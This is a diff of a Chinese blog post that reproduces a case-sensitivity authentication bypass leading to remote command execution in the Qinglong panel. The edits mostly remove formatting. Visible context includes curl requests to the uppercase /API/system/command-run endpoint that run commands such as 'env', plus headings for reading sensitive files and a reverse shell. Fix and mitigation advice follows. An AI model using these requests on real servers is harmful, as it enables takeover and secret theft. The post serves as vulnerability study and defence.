@@ -19,7 +19,7 @@ description: "青龙面板鉴权绕过漏洞复现 - 从路径大小写到 RCE -
 **联系方式 & 交流群**
 
 - **QQ**: 46333839
-- **微信**: GOV-HACK
+- **微信**: GOV-HACK  ⚠️ **博主微信暂时被封，请优先加入上方 QQ 群（46333839）**
 
 进微信群请联系博主，各位觉得文章对你有帮助的话可否打赏一些呀~
 
@@ -29,7 +29,7 @@ description: "青龙面板鉴权绕过漏洞复现 - 从路径大小写到 RCE -
 
 ---
 
-> **⚠️ 时效性提醒（2026-07 更新）**：本文发布于 2026 年 2 月，距今已近 5 个月。青龙面板该鉴权绕过漏洞在新版本中大概率已修复，**当前可用性存疑**。本文保留仅供漏洞复现学习参考，文中使用 Docker 部署的是历史漏洞版本。
+> **时效性提醒（2026-07 更新）**：本文发布于 2026 年 2 月，距今已近 5 个月。青龙面板该鉴权绕过漏洞在新版本中大概率已修复，当前可用性存疑。本文仅供漏洞复现学习参考，文中 Docker 部署的是历史漏洞版本。
 
 ---
 
@@ -56,11 +56,11 @@ curl http://localhost:5700/api/system/version
 
 ---
 
-## 💥 漏洞复现
+## 漏洞复现
 
 ### 步骤 1: 验证鉴权绕过
 
-**正常情况（需要认证）：**
+正常情况（需要认证）：
 
 ```bash
 # 直接访问 /api/ 路径会被拦截
@@ -72,7 +72,7 @@ curl -X PUT "http://localhost:5700/api/system/command-run" \
 {"code":401,"message":"未授权访问"}
 ```
 
-**利用大小写绕过：**
+利用大小写绕过：
 
 ```bash
 # 使用 /API/ (大写) 绕过鉴权
@@ -89,7 +89,7 @@ curl -X PUT "http://localhost:5700/API/system/command-run" \
 
 ### 步骤 2: 执行系统命令
 
-**获取系统信息：**
+获取系统信息：
 
 ```bash
 # 查看当前用户
@@ -108,7 +108,7 @@ curl -X PUT "http://localhost:5700/API/system/command-run" \
   -d '{"command": "env"}'
 ```
 
-**读取敏感文件：**
+读取敏感文件：
 
 ```bash
 # 读取青龙配置文件
@@ -124,7 +124,7 @@ curl -X PUT "http://localhost:5700/API/system/command-run" \
 
 ### 步骤 3: 获取 Shell
 
-**反弹 Shell：**
+反弹 Shell：
 
 ```bash
 # Bash 反弹
@@ -145,7 +145,7 @@ curl -X PUT "http://localhost:5700/API/system/command-run" \
 
 ---
 
-## 🔍 技术细节分析
+## 技术细节分析
 
 ### 1. Express 路由大小写不敏感
 
@@ -170,7 +170,7 @@ app.get('/api/test', (req, res) => {
 
 ### 2. 鉴权中间件逻辑漏洞
 
-**问题代码：**
+问题代码：
 
 ```typescript
 // back/loaders/express.ts
@@ -190,7 +190,7 @@ app.use((req, res, next) => {
 });
 ```
 
-**绕过原理：**
+绕过原理：
 
 ```
 请求路径：/API/system/command-run
@@ -208,19 +208,19 @@ app.use((req, res, next) => {
 
 | 接口路径 | 功能 | 危险等级 |
 |---------|------|---------|
-| `/api/system/command-run` | 执行系统命令 | 🔴 严重 |
-| `/api/env` | 管理环境变量 | 🟠 高 |
-| `/api/repo` | 管理仓库 | 🟠 高 |
-| `/api/subscription` | 管理订阅 | 🟡 中 |
-| `/api/user` | 用户管理 | 🟠 高 |
+| `/api/system/command-run` | 执行系统命令 | 严重 |
+| `/api/env` | 管理环境变量 | 高 |
+| `/api/repo` | 管理仓库 | 高 |
+| `/api/subscription` | 管理订阅 | 中 |
+| `/api/user` | 用户管理 | 高 |
 
 ---
 
-## 🛡️ 防御建议
+## 防御建议
 
 ### 1. 官方修复方案
 
-**修复鉴权逻辑：**
+修复鉴权逻辑：
 
 ```typescript
 // 修复后：使用正则忽略大小写
@@ -241,7 +241,7 @@ app.use((req, res, next) => {
 });
 ```
 
-**启用大小写敏感路由：**
+启用大小写敏感路由：
 
 ```typescript
 const app = express();
@@ -252,7 +252,7 @@ app.set('case sensitive routing', true);  // 启用大小写敏感
 
 ### 2. 临时缓解措施
 
-**方案 1: 反向代理过滤**
+方案 1: 反向代理过滤
 
 ```nginx
 # Nginx 配置
@@ -267,7 +267,7 @@ location / {
 }
 ```
 
-**方案 2: WAF 规则**
+方案 2: WAF 规则
 
 ```yaml
 # ModSecurity 规则
@@ -300,23 +300,23 @@ tail -f /ql/log/system.log | grep -E "(API|command|auth)"
 
 ---
 
-## 📊 影响评估
+## 影响评估
 
 ### 受影响版本
 
 | 版本 | 状态 |
 |------|------|
-| 2.20.1 | ❌ 受影响 |
-| 2.20.0 | ❌ 可能受影响 |
-| 2.19.x | ⚠️ 待确认 |
-| < 2.19 | ⚠️ 待确认 |
+| 2.20.1 | 受影响 |
+| 2.20.0 | 可能受影响 |
+| 2.19.x | 待确认 |
+| < 2.19 | 待确认 |
 
 ### 潜在危害
 
-1. **服务器完全沦陷** - 攻击者可执行任意命令
-2. **数据泄露** - 读取配置文件、数据库、密钥
-3. **内网渗透** - 以服务器为跳板攻击内网
-4. **挖矿/僵尸网络** - 植入恶意程序
+1. 服务器完全沦陷 - 攻击者可执行任意命令
+2. 数据泄露 - 读取配置文件、数据库、密钥
+3. 内网渗透 - 以服务器为跳板攻击内网
+4. 挖矿/僵尸网络 - 植入恶意程序
 
 ### 攻击场景
 
@@ -328,7 +328,7 @@ tail -f /ql/log/system.log | grep -E "(API|command|auth)"
 
 ---
 
-## 🔗 相关漏洞案例
+## 相关漏洞案例
 
 ### 1. JWT 鉴权绕过常见手法
 
@@ -341,13 +341,13 @@ tail -f /ql/log/system.log | grep -E "(API|command|auth)"
 
 ### 2. Node.js/Express 类似漏洞
 
-- **CVE-2024-29180**: express-fileupload 路径遍历
-- **CVE-2022-24999**: Express 原型污染
-- **CVE-2024-45590**: app-html 包 RCE
+- CVE-2024-29180: express-fileupload 路径遍历
+- CVE-2022-24999: Express 原型污染
+- CVE-2024-45590: app-html 包 RCE
 
 ---
 
-## 📝 时间线
+## 时间线
 
 | 日期 | 事件 |
 |------|------|
@@ -359,7 +359,7 @@ tail -f /ql/log/system.log | grep -E "(API|command|auth)"
 
 ---
 
-## 📚 参考资料
+## 参考资料
 
 1. [GitHub Issue #2934](https://github.com/whyour/qinglong/issues/2934)
 2. [Express 官方文档 - 路由](https://expressjs.com/en/guide/routing.html)
@@ -368,7 +368,7 @@ tail -f /ql/log/system.log | grep -E "(API|command|auth)"
 
 ---
 
-## 🏷️ Tags
+## Tags
 
 #鉴权绕过 #RCE #青龙面板 #Node.js 安全 #Express #漏洞复现 #渗透测试
 
